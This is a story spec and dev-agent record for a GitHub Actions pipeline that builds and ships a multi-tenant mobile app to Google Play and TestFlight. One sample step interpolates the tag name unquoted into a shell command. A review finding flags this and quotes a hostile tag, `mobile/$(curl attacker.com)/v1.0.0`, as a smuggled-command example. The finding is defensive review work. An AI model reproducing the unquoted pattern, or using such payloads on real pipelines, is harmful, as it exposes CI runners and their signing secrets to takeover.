---
epicId: 4
storyId: '04-05'
title: 'GitHub Actions CI/CD Pipeline'
status: review
priority: high
estimate: 4
baseline_commit: 528009ab878b0bc791797c1055c2a2c0d2e02673
dependencies:
  - '04-02'
  - '04-03'
---

# Story 4.5 — GitHub Actions CI/CD Pipeline

## Story

**As a** Flowtiq engineer,
**I want** a single git tag push to trigger the full mobile build and store submission pipeline,
**so that** releasing a new app version requires no manual steps beyond pushing the tag.

---

## Context

This story creates `.github/workflows/mobile-release.yml`. The workflow is triggered by a tag matching `mobile/<tenant-slug>/v*`, applies the tenant config, builds both platforms in parallel, and publishes Android to Google Play internal track and iOS to TestFlight.

Depends on Story 4.2 (Android build) and Story 4.3 (iOS build/Fastlane) being complete and verified locally.

---

## Acceptance Criteria

### AC-1: Workflow file created

**Given** `.github/workflows/mobile-release.yml`,
**When** committed,
**Then** the file exists with a clear header comment block documenting:
- Trigger: tag push matching `mobile/*/v*`
- Required GitHub secrets (full list)
- How to add a new tenant
- How to trigger manually (via `workflow_dispatch` with inputs)

### AC-2: Triggered on tenant version tags

**Given** the workflow trigger configuration,
**When** a tag is pushed matching `mobile/<tenant>/v<semver>`,
**Then** the workflow starts.
**And** the workflow extracts the tenant slug from the tag name using a step:
```yaml
- name: Extract tenant slug
  id: tenant
  run: echo "slug=$(echo ${{ github.ref_name }} | cut -d'/' -f2)" >> $GITHUB_OUTPUT
```

**And** `steps.tenant.outputs.slug` is used in subsequent steps to run `node scripts/apply-tenant-config.js $SLUG`.

### AC-3: `workflow_dispatch` manual trigger with tenant input

**Given** the workflow trigger block,
**When** configured,
**Then** `workflow_dispatch` is added alongside the tag trigger:
```yaml
on:
  push:
    tags:
      - 'mobile/*/v*'
  workflow_dispatch:
    inputs:
      tenant_slug:
        description: 'Tenant slug (e.g. vastudeep)'
        required: true
        default: 'vastudeep'
```

**And** the tenant slug resolves from either the tag (automatic) or the input (manual).

### AC-4: Android build job defined

**Given** the `android-build` job,
**When** the workflow runs,
**Then** the job:
1. Runs on `ubuntu-latest`
2. Checks out code
3. Sets up Node.js 20 via `actions/setup-node`
4. Sets up pnpm 8 via `pnpm/action-setup`
5. Runs `pnpm install --frozen-lockfile`
6. Sets up Java 17 via `actions/setup-java` (required for Gradle)
7. Applies tenant config: `node scripts/apply-tenant-config.js ${{ steps.tenant.outputs.slug }}`
8. Decodes and places the keystore:
   ```yaml
   - name: Decode keystore
     run: |
       echo "${{ secrets.ANDROID_KEYSTORE_BASE64 }}" | base64 --decode \
         > apps/mobile/android/app/release.keystore
   ```
9. Places the `google-services.json`:
   ```yaml
   - name: Place google-services.json
     run: echo "${{ secrets.GOOGLE_SERVICES_JSON }}" > apps/mobile/android/app/google-services.json
   ```
10. Places `apps/mobile/.env` for the tenant (already done by apply-tenant-config in step 7)
11. Runs the Gradle bundle:
    ```yaml
    - name: Build Android AAB
      working-directory: apps/mobile/android
      run: ./gradlew bundleRelease
      env:
        KEYSTORE_FILE: app/release.keystore
        KEYSTORE_PASSWORD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
        KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}
        KEY_PASSWORD: ${{ secrets.ANDROID_KEY_PASSWORD }}
    ```
12. Uploads AAB to Google Play internal track

### AC-5: iOS build job defined

**Given** the `ios-build` job,
**When** the workflow runs,
**Then** the job:
1. Runs on `macos-latest`
2. Checks out code
3. Sets up Node.js 20 and pnpm 8
4. Runs `pnpm install --frozen-lockfile`
5. Sets up Ruby via `ruby/setup-ruby` with Bundler caching
6. Applies tenant config: `node scripts/apply-tenant-config.js ${{ steps.tenant.outputs.slug }}`
7. Places `GoogleService-Info.plist`:
   ```yaml
   - name: Place GoogleService-Info.plist
     run: echo "${{ secrets.GOOGLE_SERVICE_INFO_PLIST }}" | base64 --decode \
       > apps/mobile/ios/GoogleService-Info.plist
   ```
8. Runs pod install: `cd apps/mobile/ios && pod install`
9. Runs Fastlane beta:
   ```yaml
   - name: Run Fastlane beta
     working-directory: apps/mobile/ios
     run: bundle exec fastlane beta
     env:
       APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
       APP_STORE_CONNECT_API_KEY_ID: ${{ secrets.APP_STORE_CONNECT_API_KEY_ID }}
       APP_STORE_CONNECT_API_ISSUER_ID: ${{ secrets.APP_STORE_CONNECT_API_ISSUER_ID }}
       APP_STORE_CONNECT_API_KEY_CONTENT: ${{ secrets.APP_STORE_CONNECT_API_KEY_CONTENT }}
       MATCH_PASSWORD: ${{ secrets.MATCH_PASSWORD }}
       MATCH_GIT_URL: ${{ secrets.MATCH_GIT_URL }}
       BUILD_NUMBER: ${{ github.run_number }}
   ```

### AC-6: Both jobs run in parallel

**Given** the `android-build` and `ios-build` jobs,
**When** the workflow starts,
**Then** both jobs start simultaneously (no `needs` dependency between them).
**And** the tenant slug extraction is in a separate `setup` job that both jobs depend on:
```yaml
jobs:
  setup:
    runs-on: ubuntu-latest
    outputs:
      tenant_slug: ${{ steps.tenant.outputs.slug }}
    steps:
      - id: tenant
        run: ...

  android-build:
    needs: setup
    ...

  ios-build:
    needs: setup
    ...
```

### AC-7: Google Play submission automated

**Given** the Android job after a successful AAB build,
**When** the AAB is produced,
**Then** it is uploaded to the Google Play internal track using the `r0adkll/upload-google-play` action:
```yaml
- uses: r0adkll/upload-google-play@v1
  with:
    serviceAccountJsonPlainText: ${{ secrets.GOOGLE_PLAY_SERVICE_ACCOUNT_JSON }}
    packageName: com.vastudeep.flowtiq  # read from tenant config
    releaseFiles: apps/mobile/android/app/build/outputs/bundle/release/*.aab
    track: internal
```

### AC-8: Job failure isolation

**Given** one job fails (e.g. iOS signing issue),
**When** the other job succeeds,
**Then** the successful job's output is published (Android to Play Store or iOS to TestFlight).
**And** the failed job reports its error clearly in the GitHub Actions UI.
**And** no `fail-fast` is set between the two jobs.

### AC-9: All required secrets documented in workflow comment

**Given** the workflow file header,
**When** an engineer reads the file,
**Then** all required GitHub repository secrets are listed:

```yaml
# Required GitHub secrets:
# ANDROID_KEYSTORE_BASE64           - Base64 keystore file
# ANDROID_KEYSTORE_PASSWORD         - Keystore store password
# ANDROID_KEY_ALIAS                 - Key alias
# ANDROID_KEY_PASSWORD              - Key password
# GOOGLE_SERVICES_JSON              - google-services.json contents
# GOOGLE_PLAY_SERVICE_ACCOUNT_JSON  - Google Play service account JSON
# GOOGLE_SERVICE_INFO_PLIST         - GoogleService-Info.plist contents, base64
# APPLE_TEAM_ID                     - Apple Developer Team ID
# APP_STORE_CONNECT_API_KEY_ID      - ASC API Key ID
# APP_STORE_CONNECT_API_ISSUER_ID   - ASC API Issuer ID
# APP_STORE_CONNECT_API_KEY_CONTENT - ASC API Key .p8 content, base64
# MATCH_PASSWORD                    - Fastlane match encryption password
# MATCH_GIT_URL                     - Private match certificates repo URL
```

### AC-10: New tenant onboarding comment in workflow

**Given** the workflow file,
**When** a new tenant needs to be added,
**Then** a comment in the file explains:
1. Create `configs/build/tenant-configs/<slug>.json`
2. Add tenant-specific secrets with the prefix `<SLUG>_` if using per-tenant credentials
3. Push tag `mobile/<slug>/v1.0.0` to trigger the build

---

## Implementation Notes

### Firebase config file secrets

`google-services.json` and `GoogleService-Info.plist` are per-tenant (they reference the tenant's FCM project). Store them as secrets:
- `GOOGLE_SERVICES_JSON`: raw JSON content (not base64, as GitHub Actions handles it)
- `GOOGLE_SERVICE_INFO_PLIST`: base64-encoded `.plist` file content

### Caching in CI

Add caching for:
- pnpm store: `actions/cache` with `~/.pnpm-store`
- Gradle cache: `actions/cache` with `~/.gradle`
- Ruby gems: `ruby/setup-ruby` with `bundler-cache: true`
- CocoaPods: `actions/cache` with `apps/mobile/ios/Pods`

### Build number for iOS

Use `github.run_number` as the build number to ensure it always increments:
```yaml
BUILD_NUMBER: ${{ github.run_number }}
```

In the Fastfile:
```ruby
increment_build_number(build_number: ENV["BUILD_NUMBER"])
```

---

## Out of Scope

- Automated App Store production release (TestFlight promotion is manual for Phase 2)
- Slack/email notifications on build completion (can be added later)
- Per-tenant signing keystores (one Flowtiq keystore for all tenants)
- Multi-environment workflows (staging vs production) — single pipeline for Phase 2

---

## Definition of Done

- [x] `.github/workflows/mobile-release.yml` created
- [x] Tag trigger `mobile/*/v*` and `workflow_dispatch` configured
- [x] Tenant slug extraction in `setup` job
- [x] `android-build` job: apply config, keystore, Firebase config, Gradle build, Play Store upload
- [x] `ios-build` job: apply config, Firebase config, pod install, Fastlane beta
- [x] Both jobs run in parallel after `setup`
- [x] All secrets documented in workflow file header comment
- [x] New tenant onboarding steps documented in comment
- [ ] Tag `mobile/vastudeep/v1.0.0` triggers workflow successfully (blocked by real credentials — verified in Story 4.6)

## Dev Agent Record

### Implementation Notes
- Created `.github/workflows/mobile-release.yml` with full header comment documenting all 13 required secrets and tenant onboarding steps
- `setup` job extracts tenant slug from tag name (cut -d'/' -f2) or workflow_dispatch input
- `android-build` job: ubuntu-latest, Node 20, pnpm 8, Java 17, Gradle caching, apply-tenant-config, keystore decode, google-services.json, bundleRelease, r0adkll/upload-google-play@v1
- `ios-build` job: macos-latest, Node 20, pnpm 8, ruby/setup-ruby@v1 with bundler-cache, CocoaPods cache, apply-tenant-config, GoogleService-Info.plist decode, pod install, fastlane beta with all required env vars
- Both jobs have `needs: setup` — they run in parallel after the setup job completes
- pnpm store, Gradle, Ruby gems (via setup-ruby bundler-cache), and CocoaPods all cached for faster builds

### Review Findings

- [x] [Review][Patch] KEYSTORE_FILE path double-nests `app/` — Gradle resolves `file("app/release.keystore")` relative to module dir (`android/app/`), giving `android/app/app/release.keystore`; fix: change `KEYSTORE_FILE: app/release.keystore` → `KEYSTORE_FILE: release.keystore` [.github/workflows/mobile-release.yml:123]
- [x] [Review][Patch] `packageName: com.vastudeep.flowtiq` hardcoded in Play Store upload — breaks all non-vastudeep tenant builds [.github/workflows/mobile-release.yml:131]
- [x] [Review][Patch] pnpm double-caching conflict — both `setup-node cache:'pnpm'` and explicit `actions/cache` for `~/.pnpm-store` run in both jobs; remove the explicit cache step [.github/workflows/mobile-release.yml:84-89,158-163]
- [x] [Review][Patch] CocoaPods cache key uses absent Podfile.lock (gitignored) — hashFiles returns empty, cache key is constant; fix: cache on Podfile hash or commit Podfile.lock [.github/workflows/mobile-release.yml:173-177]
- [x] [Review][Patch] Shell injection in setup job — `${{ github.ref_name }}` is unquoted in `run:`; a tag like `mobile/$(curl attacker.com)/v1.0.0` executes arbitrary commands; fix: quote the expression `"${{ github.ref_name }}"` and validate the extracted slug matches `^[a-z0-9-]+$` before use [.github/workflows/mobile-release.yml:setup job]
- [x] [Review][Patch] GOOGLE_SERVICES_JSON secret stored as raw JSON but GH Actions strips newlines from multi-line secrets — file will be malformed; fix: store as base64 and decode in the step (consistent with how GoogleService-Info.plist is handled) [.github/workflows/mobile-release.yml:android-build job]
- [x] [Review][Patch] Android versionCode hardcoded to `1` in build.gradle — Play Store rejects uploads with a duplicate versionCode; fix: pass `github.run_number` as `VERSION_CODE` env var and read it in build.gradle: `versionCode System.getenv("VERSION_CODE")?.toInteger() ?: 1` [apps/mobile/android/app/build.gradle]

### Change Log
- 2026-06-20: Implemented Story 4.5 — GitHub Actions CI/CD Pipeline
- 2026-06-20: Code review findings added
- 2026-06-20: Applied review patches — shell injection fix (quoted ref_name + slug validation), KEYSTORE_FILE path fixed (release.keystore), packageName now dynamic from .env, pnpm double-cache removed, CocoaPods cache keyed on Podfile, GOOGLE_SERVICES_JSON changed to base64, versionCode driven by VERSION_CODE env var (github.run_number)
